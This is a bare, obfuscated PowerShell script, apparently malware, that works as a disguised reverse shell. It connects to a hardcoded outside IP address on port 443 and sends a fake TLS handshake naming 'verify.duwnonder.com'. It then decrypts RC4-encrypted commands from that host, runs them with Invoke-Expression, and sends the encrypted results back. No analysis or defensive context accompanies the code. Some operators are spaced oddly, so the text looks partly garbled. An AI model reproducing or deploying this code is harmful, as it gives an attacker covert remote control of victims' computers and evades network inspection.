$global_key = 0xf1,
   0x6e,
   0xcd,
   0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02,
   0xf8, 0x33, 0xc4, 0x86,
   0xe7, 0xa4,
   0x35, 0x8d,
   0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf,
   0x0b, 0x9e, 0x53,
   0xa4, 0xd3

function decrypt_xor {
   param([int[]] $encrypted, [int] $xor_key)
   $original = ""
   foreach($B888BB88888BBBBB in $encrypted) {
       $original += [char]($B888BB88888BBBBB - bxor $xor_key)
   }
   return $original
}

function rc4 {
   param(
       [byte[]] $rc4_key,
       [byte[]] $data
   )
   $SBox = 0. .255
   $B888B8BB888BB88B = 0
   for ($i = 0; $i - lt 256; $i++) {
       $B888B8BB888BB88B = ($B888B8BB888BB88B + $SBox[$i] + $rc4_key[$i % $rc4_key.Length]) % 256
       $SBox[$i], $SBox[$B888B8BB888BB88B] = $SBox[$B888B8BB888BB88B], $SBox[$i]
   }
   $i = 0
   $B888B8BB888BB88B = 0
   $BBBBB8BBB8BBB88B = @()
   foreach($BBBB88888B888BBB in $data) {
       $i = ($i + 1) % 256
       $B888B8BB888BB88B = ($B888B8BB888BB88B + $SBox[$i]) % 256
       $SBox[$i], $SBox[$B888B8BB888BB88B] = $SBox[$B888B8BB888BB88B], $SBox[$i]
       $B88BBB888BBB88B8 = $SBox[($SBox[$i] + $SBox[$B888B8BB888BB88B]) % 256]
       $BBBBB8BBB8BBB88B += ($BBBB88888B888BBB - bxor $B88BBB888BBB88B8)
   }
   return, $BBBBB8BBB8BBB88B
}

function create_tls_payload {
   param([string] $raw_payload)
   $payload_bytes = [System.Text.Encoding]::UTF8.GetBytes($raw_payload)
   $encrypted = (rc4 - rc4_key $global_key - data $payload_bytes) + (0x02, 0x04, 0x06, 0x08)
   $payload_size = [System.BitConverter]::GetBytes([int16] $encrypted.Length)[Array]::Reverse($payload_size)
   return (0x17, 0x03, 0x03) + $payload_size + $encrypted
}

function tls_handshake {
   $website = 'verify.duwnonder.com'
   $website_bytes = [System.Text.Encoding]::ASCII.GetBytes($website)
   $website_length = [byte[]]([BitConverter]::GetBytes([UInt16] $website_bytes.Length))[Array]::Reverse($website_length)
   $website_length_bytes = @(0x00) + $website_length + $website_bytes

   $length1 = [byte[]]([BitConverter]::GetBytes([UInt16] $website_length_bytes.Length))[Array]::Reverse($length1)

   $length_and_website = $length1 + $website_length_bytes
   $length2 = [byte[]]([BitConverter]::GetBytes([UInt16] $length_and_website.Length))[Array]::Reverse($length2)
   $encapsulated = @(0x00,
       0x00) + $length2 + $length_and_website
   $trailer = @(0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
       0x00, 0x0a, 0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e, 0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02, 0x01, 0x03, 0x01, 0x04,
       0x00, 0x23, 0x00, 0x00,
       0x00, 0x16, 0x00, 0x00,
       0x00, 0x17, 0x00, 0x00,
       0x00, 0x0d, 0x00, 0x1e, 0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07, 0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04, 0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
       0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04,
       0x00, 0x2d, 0x00, 0x02, 0x01, 0x01,
       0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20,
       0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80, 0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38, 0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0, 0xd2, 0xcd, 0x16, 0x62, 0x54)
   $encapsulated_payload = $encapsulated + $trailer
   $encapsulated_payload_len = [byte[]]([BitConverter]::GetBytes([UInt16] $encapsulated_payload.Length))[Array]::Reverse($encapsulated_payload_len)
   $payload_header = @(0x03, 0x03, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c,
       0x0d, 0x0e, 0x0f,
       0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
       0x18,
       0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0xe0, 0xe1,
       0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa,
       0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00)
   $combined_payload = $payload_header + $encapsulated_payload_len + $encapsulated_payload
   $combined_payload_len = [byte[]]([BitConverter]::GetBytes($combined_payload.Length))[Array]::Reverse($combined_payload_len)
   $final_payload = @(0x01) + $combined_payload_len[1. .3] + $combined_payload
   $final_payload_len = [byte[]]([BitConverter]::GetBytes([UInt16] $final_payload.Length))[Array]::Reverse($final_payload_len)
   $tls_handshake_payload = @(0x16,
       0x03, 0x01) + $final_payload_len + $final_payload
   return, $tls_handshake_payload
}

$client_sock = New - Object System.Net.Sockets.TcpClient
$client_sock.Connect(('20.5.48.200', 443)
$comm_stream = $client_sock.GetStream()
$tls_handshake_payload = tls_handshake
$comm_stream.Write($tls_handshake_payload, 0, $tls_handshake_payload.Length)
$recv_buffer = New - Object byte[] 16384
$comm_stream.Read($recv_buffer, 0, $recv_buffer.Length) | Out - Null
while ($true) {
   $recv_buffer = New - Object byte[] 16384
   try {
       $bytesReceived = $comm_stream.Read($recv_buffer, 0, 16384)
   } catch {
       break
   }
   $encrypted = $recv_buffer[5..($bytesReceived - 1)]
   $recv_decrypted = [System.Text.Encoding]::UTF8.GetString((rc4 - rc4_key $global_key - data $encrypted))
   if ($recv_decrypted - eq('exit')) {
       break
   }
   try {
       $cmdResult = (Invoke - Expression $recv_decrypted 2 > & 1) | Out - String
   } catch {
       $cmdResult = 'Error'
   }
   $encrypted_payload = create_tls_payload - raw_payload $cmdResult.Trim()
   $comm_stream.Write($encrypted_payload, 0, $encrypted_payload.Length)
}
$comm_stream.Close()
$client_sock.Close()